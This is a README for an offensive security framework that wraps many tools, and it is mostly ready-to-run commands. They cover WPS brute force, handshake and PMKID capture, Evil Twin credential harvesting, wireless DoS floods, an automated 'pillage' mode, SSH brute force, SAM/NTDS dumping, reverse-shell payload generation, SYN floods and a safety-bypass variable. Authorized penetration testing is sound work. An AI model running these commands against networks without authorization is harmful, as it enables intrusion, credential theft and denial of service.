# VOID WAVE

**The Complete Offensive Security & Wireless Attack Framework**

v8.2.0 — Network Recon | OSINT | Exploitation | WiFi Assault | Credential Attacks

---

> *"The airwaves belong to those who listen."*

VOID WAVE is a comprehensive offensive security framework combining **70+ security tools** into a unified toolkit. From network reconnaissance and OSINT to full wireless attack suites, credential cracking, exploitation, and traffic analysis — all accessible through an interactive menu or direct CLI.

---

## Table of Contents

- [Quick Start](#quick-start)
- [Features Overview](#features-overview)
- [Session Memory](#session-memory)
- [Network Reconnaissance](#network-reconnaissance)
- [Scanning & Enumeration](#scanning--enumeration)
- [OSINT Module](#osint-module)
- [Wireless Attack Suite](#wireless-attack-suite)
- [Credential Attacks](#credential-attacks)
- [Exploitation Module](#exploitation-module)
- [Traffic Analysis](#traffic-analysis)
- [Stress Testing](#stress-testing)
- [Configuration](#configuration)
- [Architecture](#architecture)
- [Installation](#installation)
- [Legal Disclaimer](#legal-disclaimer)

---

## Quick Start

```bash
# Install from source directory
cd VOIDWAVE
sudo ./install.sh

# Launch interactive menu
sudo voidwave

# Or use CLI commands
voidwave scan 192.168.1.0/24
voidwave wifi monitor on wlan0
voidwave status
```

---

## Features Overview

| Category | Tools & Capabilities |
|----------|---------------------|
| **Reconnaissance** | nmap (7 modes), masscan, rustscan, netdiscover, ARP scan, ping sweep, DNS enum, SSL analysis |
| **Scanning** | Port scanning, service enumeration, OS detection, vulnerability scanning, SMB enum |
| **OSINT** | theHarvester, recon-ng, Shodan, Amass, Subfinder, Sherlock, Holehe, SpiderFoot, Maltego |
| **Wireless** | 11 WPS attacks, PMKID capture, handshake capture, Evil Twin, DoS, WEP cracking, Enterprise attacks |
| **Credentials** | hashcat (GPU), John, Hydra, Medusa, CrackMapExec, ncrack, secretsdump |
| **Exploitation** | Metasploit, SQLmap, Nikto, Gobuster, Nuclei, XSStrike, Commix |
| **Traffic** | tcpdump, Wireshark, tshark, Ettercap, Bettercap, mitmproxy |
| **Stress** | hping3, Slowloris, netem network impairment |
| **Session Memory** | Auto-remembers networks, hosts, interfaces, APs; smart resource selection with auto-scan |

---

## Session Memory

VOID WAVE includes an intelligent session memory system that tracks your recent scan targets, discovered networks, hosts, wireless interfaces, and access points throughout your session.

### How It Works

When any operation needs a resource (target IP, network, interface, AP), the system:

1. **Checks memory** for recent items of that type
2. **If recent items exist** — Shows selection menu:
   - Select from recent items
   - Scan for new items
   - Enter manually
3. **If no recent items** — Prompts Y/N to auto-scan:
   - **Y**: Runs appropriate discovery scan, saves results, allows selection
   - **N**: Requires manual input

### Memory Types

| Type | Description | Auto-Scan Function |
|------|-------------|-------------------|
| `network` | IP addresses, CIDR ranges | Local network discovery |
| `host` | Discovered hosts | ARP scan / ping sweep |
| `interface` | Network interfaces | Interface enumeration |
| `wireless` | Access points (BSSID/channel) | Wireless scan (airodump-ng) |

### CLI Commands

```bash
# View all session memory
voidwave memory show

# View specific memory type
voidwave memory show network
voidwave memory show host
voidwave memory show interface
voidwave memory show wireless

# Clear memory
voidwave memory clear           # Clear all
voidwave memory clear network   # Clear specific type

# Add entry manually
voidwave memory add network 192.168.1.0/24
voidwave memory add host 192.168.1.100 "web server"
```

### Benefits

- **No repetitive typing** — Previously scanned targets are instantly available
- **Smart suggestions** — Recent items shown first when selecting targets
- **Auto-discovery** — One-click scanning when starting fresh
- **Seamless workflow** — Memory persists throughout your session
- **Universal integration** — Works across all menus: Scan, Recon, Wireless, Traffic, Stress, Credentials

---

## Network Reconnaissance

### Nmap Scanning

7 pre-configured scan modes plus custom options:

```bash
# Quick scan (-T4 -F)
run_nmap_quick 192.168.1.0/24

# Full scan (all ports, version detection)
run_nmap_full 192.168.1.1

# Stealth SYN scan
run_nmap_stealth 192.168.1.1

# UDP scan
run_nmap_udp 192.168.1.1

# Vulnerability scan (NSE scripts)
run_nmap_vuln 192.168.1.1

# Service/version detection
run_nmap_service 192.168.1.1

# OS detection
run_nmap_os 192.168.1.1

# Custom flags
run_nmap_custom 192.168.1.1 "-sS -sV -p1-1000 --script=http-*"
```

### Fast Scanners

```bash
# Masscan (millions of packets/sec)
run_masscan 192.168.0.0/16 "1-65535"

# Rustscan (Rust-powered)
run_rustscan 192.168.1.1

# Unicornscan
run_unicornscan 192.168.1.1

# ZMap (internet-scale)
run_zmap 192.168.0.0/16 80
```

### Network Discovery

```bash
# ARP scan (local network)
run_arp_scan 192.168.1.0/24

# Netdiscover (passive/active)
run_netdiscover eth0

# Ping sweep
run_ping_sweep 192.168.1.0/24
```

### DNS & SSL Analysis

```bash
# DNS enumeration
run_dnsenum example.com
run_dnsrecon example.com

# SSL/TLS analysis
run_sslscan example.com
run_sslyze example.com

# SNMP sweep
run_snmp_sweep 192.168.1.0/24

# SMB enumeration
run_smb_enum 192.168.1.100
```

---

## Scanning & Enumeration

### Port Scanning

| Function | Description |
|----------|-------------|
| `run_nmap_scan` | Basic SYN scan with version detection |
| `run_nmap_quick` | Fast top-ports scan |
| `run_nmap_full` | All 65535 ports |
| `run_nmap_stealth` | Low-and-slow evasion |
| `run_masscan` | Ultra-fast port discovery |
| `run_rustscan` | Rust-powered speed |

### Service Enumeration

```bash
# SMB enumeration
run_smb_enum 192.168.1.100

# SNMP enumeration
run_snmp_sweep 192.168.1.0/24

# Service version detection
run_nmap_service 192.168.1.1
```

---

## OSINT Module

### Email & Domain Intelligence

```bash
# theHarvester (emails, subdomains, hosts)
run_theharvester example.com
run_theharvester_full example.com  # All sources

# Recon-ng framework
run_recon_ng example.com
run_recon_ng_workspace "project1"

# Amass (subdomain enumeration)
run_amass example.com

# Subfinder
run_subfinder example.com
```

### Shodan Integration

```bash
# Host lookup
run_shodan_host 8.8.8.8

# Search query
run_shodan_search "apache port:80"

# Domain search
run_shodan_domain example.com
```

### DNS & WHOIS

```bash
# WHOIS lookup
run_whois example.com

# DNS enumeration
run_dns_enum example.com

# Reverse DNS
run_reverse_dns 192.168.1.1
```

### Username OSINT

```bash
# Sherlock (social media)
run_sherlock "username"

# Holehe (email existence)
run_holehe "user@example.com"

# Google dork generator
generate_dorks example.com
```

### Advanced OSINT

```bash
# SpiderFoot
run_spiderfoot example.com

# Maltego integration
run_maltego
```

---

## Wireless Attack Suite

### WPS Attacks (11 Methods)

```bash
# Pixie-Dust (offline PIN recovery)
wps_pixie_reaver wlan0mon AA:BB:CC:DD:EE:FF 6
wps_pixie_bully wlan0mon AA:BB:CC:DD:EE:FF 6
wps_pixie_auto wlan0mon AA:BB:CC:DD:EE:FF 6   # Auto-select best tool

# PIN bruteforce
wps_bruteforce_reaver wlan0mon AA:BB:CC:DD:EE:FF 6
wps_bruteforce_bully wlan0mon AA:BB:CC:DD:EE:FF 6
wps_bruteforce_with_delay wlan0mon AA:BB:CC:DD:EE:FF 6 5

# Algorithm-based PIN generation
wps_try_algorithm_pins wlan0mon AA:BB:CC:DD:EE:FF 6  # ComputePIN, EasyBox, Arcadyan

# Known PINs database (100+ vendor defaults)
wps_try_known_pins wlan0mon AA:BB:CC:DD:EE:FF 6

# Null PIN exploit
wps_null_pin_attack wlan0mon AA:BB:CC:DD:EE:FF 6
```

### PMKID Capture (Clientless)

```bash
# Targeted capture
pmkid_capture_target wlan0mon AA:BB:CC:DD:EE:FF "NetworkName"

# Mass collection
pmkid_capture_all wlan0mon

# Vulnerability check
pmkid_check_vulnerable wlan0mon AA:BB:CC:DD:EE:FF 6
```

### Handshake Capture

```bash
# Full capture with smart deauth
handshake_capture_full wlan0mon AA:BB:CC:DD:EE:FF 6 "SSID"

# Passive capture (no deauth)
handshake_capture_passive wlan0mon AA:BB:CC:DD:EE:FF 6 "SSID"

# Target specific client
handshake_capture_full wlan0mon AA:BB:CC:DD:EE:FF 6 "SSID" "CC:DD:EE:FF:00:11"

# Validate & convert
handshake_validate capture.cap AA:BB:CC:DD:EE:FF
handshake_convert_hashcat capture.cap  # → .hc22000
handshake_convert_john capture.cap     # → .john
```

### Evil Twin Framework

```bash
# Full attack with captive portal
et_attack_full wlan0 wlan1mon "FreeWiFi" AA:BB:CC:DD:EE:FF 6 "en"

# Simple open AP
et_attack_simple wlan0 "FreeWiFi" 6

# WPA honeypot
et_attack_wpa wlan0 "FreeWiFi" 6 "password123"

# Watch for credentials
et_watch_credentials
```

**Captive Portal Languages:** English, Spanish, French, German, Italian, Portuguese, Russian, Chinese, Japanese, Korean, Arabic, Dutch, Polish

### DoS Attacks

```bash
# Deauthentication
dos_deauth wlan0mon AA:BB:CC:DD:EE:FF              # Broadcast
dos_deauth wlan0mon AA:BB:CC:DD:EE:FF CC:DD:EE:FF  # Targeted

# Amok mode (all networks)
dos_amok_mode wlan0mon

# Beacon flood
dos_beacon_flood wlan0mon                          # Random SSIDs
dos_beacon_clone wlan0mon "TargetSSID" 20          # Clone flood

# Auth flood / TKIP Michael
dos_auth_flood wlan0mon AA:BB:CC:DD:EE:FF
dos_tkip_michael wlan0mon AA:BB:CC:DD:EE:FF        # 60s shutdown

# Pursuit mode (follows target)
dos_pursuit_mode wlan0mon AA:BB:CC:DD:EE:FF
```

### WEP Attacks

```bash
# Full automated attack
wep_attack_full wlan0mon AA:BB:CC:DD:EE:FF 6 "SSID"

# Individual attacks
wep_arp_replay wlan0mon AA:BB:CC:DD:EE:FF mac
wep_chopchop wlan0mon AA:BB:CC:DD:EE:FF mac xor
wep_fragmentation wlan0mon AA:BB:CC:DD:EE:FF mac xor
wep_caffe_latte wlan0mon CC:DD:EE:FF:00:11
wep_hirte wlan0mon CC:DD:EE:FF:00:11

# Crack IVs
wep_crack capture.ivs AA:BB:CC:DD:EE:FF
wep_crack_ptw capture.cap AA:BB:CC:DD:EE:FF
```

### Enterprise Attacks

```bash
# hostapd-wpe attack
ent_attack_full wlan0 wlan1mon "CorpNet" AA:BB:CC:DD:EE:FF 6

# Karma attack
ent_attack_karma wlan0

# Credential harvesting
ent_watch_credentials
ent_export_hashcat         # → hashes.5500
ent_crack_hashcat hashes.5500 wordlist.txt
```

### Advanced Features

```bash
# Hidden SSID reveal
hidden_scan wlan0mon
hidden_reveal_deauth wlan0mon AA:BB:CC:DD:EE:FF 6

# WPA3 downgrade
wpa3_check wlan0mon AA:BB:CC:DD:EE:FF 6
wpa3_downgrade_transition wlan0mon "SSID" 6

# WIDS evasion
evasion_randomize wlan0mon
evasion_clone_ap wlan0mon AA:BB:CC:DD:EE:FF 6
```

### Automation Engine

```bash
# Pillage mode (attack everything)
auto_pillage wlan0mon

# Continuous pillage
auto_pillage_continuous wlan0mon

# Smart mode (prioritize weak targets)
auto_smart wlan0mon

# Custom attack chain
AUTO_ATTACK_CHAIN=("pmkid" "handshake" "wps")
auto_pillage wlan0mon

# Schedule attack
auto_schedule wlan0mon "02:00" AA:BB:CC:DD:EE:FF
```

---

## Credential Attacks

### Hashcat (GPU Cracking)

```bash
# Basic attack
run_hashcat_gpu hashes.txt wordlist.txt 0    # Mode 0 = MD5

# Rule-based attack
run_hashcat_rules hashes.txt wordlist.txt 0 best64.rule

# Custom attack
run_hashcat_custom hashes.txt "-a 3 -m 0 ?a?a?a?a?a?a"

# WPA/WPA2 cracking
crack_hashcat hashes.22000 wpa wordlist.txt
crack_hashcat_smart hashes.22000 wpa        # Multi-phase
```

### John the Ripper

```bash
# Standard attack
run_john hashes.txt wordlist.txt

# WiFi hashes
run_john_wifi capture.hccapx wordlist.txt

# Format-specific
crack_john hashes.john wpapsk wordlist.txt
```

### Network Brute Force

```bash
# Hydra (SSH)
run_hydra_ssh 192.168.1.1 root wordlist.txt

# Hydra (generic)
run_hydra 192.168.1.1 ssh root wordlist.txt

# Medusa
run_medusa 192.168.1.1 ssh root wordlist.txt

# ncrack
run_ncrack 192.168.1.1 ssh root wordlist.txt
```

### Active Directory

```bash
# CrackMapExec
run_crackmapexec 192.168.1.0/24 smb user pass

# CrackMapExec enumeration
run_cme_enum 192.168.1.100 user pass

# Secretsdump (SAM/NTDS)
run_secretsdump 192.168.1.100 user pass
```

### Unified Cracking Interface

```bash
# Auto-detect and crack
crack_auto capture.cap wordlist.txt

# Batch crack all captures
crack_batch /path/to/captures/ wordlist.txt

# GPU detection
crack_detect_gpu

# Wordlist management
crack_list_wordlists
crack_find_wordlist rockyou.txt
crack_generate_wordlist custom.txt 8 12
```

---

## Exploitation Module

### Metasploit Integration

```bash
# Launch Metasploit console
run_metasploit

# Run resource script
run_metasploit_rc script.rc

# Generate payload
run_msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 exe
```

### SQL Injection

```bash
# Basic SQLmap
run_sqlmap "http://target.com/page?id=1"

# Advanced SQLmap
run_sqlmap_advanced "http://target.com/page?id=1" "--risk=3 --level=5 --dump"
```

### Web Application Testing

```bash
# Nikto (web server scanner)
run_nikto http://target.com

# Directory brute force
run_gobuster http://target.com wordlist.txt
run_dirb http://target.com
run_feroxbuster http://target.com wordlist.txt

# Nuclei (vulnerability scanner)
run_nuclei http://target.com

# Searchsploit
run_searchsploit "apache 2.4"
```

### Injection Attacks

```bash
# XSS testing
run_xsstrike "http://target.com/page?q=test"

# Command injection
run_commix "http://target.com/page?cmd=test"
```

---

## Traffic Analysis

### Packet Capture

```bash
# tcpdump
run_tcpdump eth0 "port 80"

# Wireshark (GUI)
run_wireshark eth0

# tshark (CLI)
run_tshark eth0 "http"
```

### MITM Attacks

```bash
# Ettercap
run_ettercap eth0 192.168.1.1 192.168.1.100

# Bettercap
run_bettercap eth0

# mitmproxy
run_mitmproxy 8080
```

---

## Stress Testing

### Network Stress

```bash
# hping3 SYN flood
run_hping_attack 192.168.1.1 80 syn 30 1000

# Slowloris (HTTP)
run_slowloris 192.168.1.1 80

# Network impairment (netem)
run_netem eth0 delay 100ms 60
run_netem eth0 loss 10% 60
run_netem eth0 corrupt 5% 60
```

---

## Configuration

### CLI Options

```bash
voidwave [OPTIONS] <COMMAND> [ARGS...]

Options:
  -i, --interactive   Launch interactive menu
  -n, --dry-run       Preview commands without executing
  -j, --json          Output in JSON format
  -q, --quiet         Suppress banners and info
  -v, --verbose       Enable debug output
  -V, --version       Show version
  -h, --help          Show help
  -t, --target <IP>   Specify target
  -o, --output <DIR>  Override output directory
```

### Config Management

```bash
voidwave config show              # Show all settings
voidwave config get <key>         # Get value
voidwave config set <key> <val>   # Set value
voidwave config reset             # Reset to defaults
```

### Wireless Settings

| Setting | Default | Description |
|---------|---------|-------------|
| `wireless.auto_monitor` | `true` | Auto-enable monitor mode |
| `wireless.deauth_count` | `10` | Deauth packets per round |
| `wireless.handshake_timeout` | `300` | Capture timeout |
| `wireless.wps_timeout` | `600` | WPS attack timeout |
| `wireless.preferred_wps_tool` | `reaver` | reaver, bully, auto |
| `wireless.preferred_cracker` | `hashcat` | hashcat, john, aircrack |

### Environment Variables

| Variable | Description |
|----------|-------------|
| `VW_NON_INTERACTIVE` | Force non-interactive mode |
| `VW_UNSAFE_MODE` | Bypass safety checks |
| `VW_DRY_RUN` | Preview mode |
| `CRACK_USE_GPU` | Enable GPU acceleration |

---

## Architecture

```
VOID WAVE/
├── bin/
│   ├── voidwave              # Main CLI dispatcher
│   └── voidwave-install      # Tool installer (70+ tools)
├── lib/
│   ├── core.sh               # Logging, colors, errors
│   ├── ui.sh                 # User interface
│   ├── config.sh             # Configuration management
│   ├── detection.sh          # System detection
│   ├── safety.sh             # Safety gates
│   ├── sessions.sh           # Session persistence
│   ├── utils.sh              # Utilities
│   ├── wizards.sh            # Guided workflows
│   ├── menu.sh               # Interactive menu
│   ├── wireless.sh           # Core wireless functions
│   ├── wireless_loader.sh    # Module loader
│   ├── menus/                # Category menus
│   │   ├── wireless_menu.sh
│   │   ├── scan_menu.sh
│   │   ├── recon_menu.sh
│   │   ├── osint_menu.sh
│   │   ├── creds_menu.sh
│   │   ├── exploit_menu.sh
│   │   ├── traffic_menu.sh
│   │   └── stress_menu.sh
│   ├── wireless/             # Wireless infrastructure
│   │   ├── adapter.sh        # Chipset detection
│   │   ├── config.sh         # Wireless config
│   │   ├── deps.sh           # Dependency management
│   │   ├── loot.sh           # Capture management
│   │   ├── mac.sh            # MAC spoofing
│   │   └── session.sh        # Session persistence
│   ├── attacks/              # Attack modules
│   │   ├── wps.sh            # 11 WPS methods
│   │   ├── handshake.sh      # Handshake capture
│   │   ├── pmkid.sh          # PMKID attacks
│   │   ├── dos.sh            # DoS attacks
│   │   ├── eviltwin.sh       # Evil Twin
│   │   ├── wep.sh            # WEP attacks
│   │   ├── enterprise.sh     # WPA Enterprise
│   │   └── advanced.sh       # Hidden SSID, WPA3
│   ├── automation/
│   │   └── engine.sh         # Pillage mode
│   └── cracking/
│       └── cracker.sh        # Unified cracking
├── modules/                  # Feature modules
│   ├── recon.sh              # Reconnaissance
│   ├── scanning.sh           # Port scanning
│   ├── osint.sh              # OSINT tools
│   ├── credentials.sh        # Credential attacks
│   ├── exploit.sh            # Exploitation
│   ├── traffic.sh            # Traffic analysis
│   ├── stress.sh             # Stress testing
│   └── wireless.sh           # Wireless module
├── data/
│   └── wps_pins.db           # Known WPS PINs
└── docs/                     # Documentation
```

---

## Installation

### Install from Source

```bash
cd VOIDWAVE
sudo ./install.sh
```

### Install All Tools

```bash
sudo voidwave-install --install-all
```

### Supported Distributions

- **Debian-based:** Ubuntu, Debian, Kali, Parrot OS, Linux Mint, Pop!_OS
- **RPM-based:** Fedora, RHEL, CentOS, Rocky Linux, AlmaLinux, openSUSE
- **Arch-based:** Arch Linux, Manjaro, BlackArch, EndeavourOS
- **Alpine:** Alpine Linux

---

## Recommended Hardware

### Wireless Adapters

| Chipset | VIF Support | Rating | Notes |
|---------|-------------|--------|-------|
| MT7612U | Yes | Best | Dual-band, excellent injection |
| AR9271 | Yes | Best | Classic, very stable |
| RTL8812AU | Yes | Good | 5GHz support |
| RT3070 | Yes | Good | Reliable, single-band |
| RTL8814AU | No | Fair | Good range, no VIF |
| MT7601U | No | Poor | Basic only |

---

## Legal Disclaimer

```
Copyright (c) 2025
SPDX-License-Identifier: Apache-2.0
```

**VOID WAVE is designed for authorized security testing only.**

By using this software, you acknowledge:
- You have **written authorization** to test target systems
- You accept **full legal responsibility** for your actions
- Unauthorized access to computer systems is a **federal crime**
- Wireless attacks may violate FCC regulations and local laws

The authors and contributors are not responsible for misuse.

---

## Acknowledgments

Built on the shoulders of giants:
- **Airgeddon** — Attack methodology inspiration
- **Wifite2** — Automation concepts
- **aircrack-ng** — Core wireless tools
- **hcxtools** — PMKID/handshake processing
- **hashcat** — GPU-accelerated cracking
- **Metasploit** — Exploitation framework
- **nmap** — Network scanning

---

**VOID WAVE** — The Complete Offensive Security Framework

v8.2.0 | 70+ Tools | Network Recon | OSINT | WiFi Assault | Exploitation

*"The airwaves belong to those who listen."*
# VOIDWAVE
# VOIDWAVE
